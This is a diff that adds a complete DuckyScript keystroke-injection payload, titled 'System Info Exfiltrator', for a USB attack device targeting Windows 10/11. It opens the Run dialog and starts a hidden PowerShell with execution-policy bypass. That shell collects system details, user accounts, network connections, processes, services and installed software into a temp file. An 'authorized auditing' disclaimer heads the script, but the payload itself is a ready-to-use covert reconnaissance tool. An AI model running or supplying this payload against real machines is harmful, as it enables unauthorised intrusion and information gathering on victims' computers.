@@ -1,0 +1,15 @@
+REM ==============================================
+REM CYBERFLIPPER — System Info Exfiltrator
+REM Inspired by Hak5 USB Rubber Ducky payloads
+REM Collects system information for authorized
+REM security auditing purposes only.
+REM ==============================================
+REM TARGET: Windows 10/11
+REM AUTHOR: @CYBERFLIPPER / FLLC
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"$out = $env:TEMP + \\\"\sysinfo_audit.txt\\\"; systeminfo | Out-File $out; ipconfig /all >> $out; net user >> $out; netstat -an >> $out; Get-Process | Out-String >> $out; Get-Service | Where-Object {$_.Status -eq \\\"Running\\\"} | Out-String >> $out; Get-NetAdapter | Out-String >> $out; Get-WmiObject Win32_Product | Select-Object Name,Version | Out-String >> $out; Write-Host \\\"Audit saved to $out\\\"\"' -WindowStyle Hidden"
+ENTER
+DELAY 5000
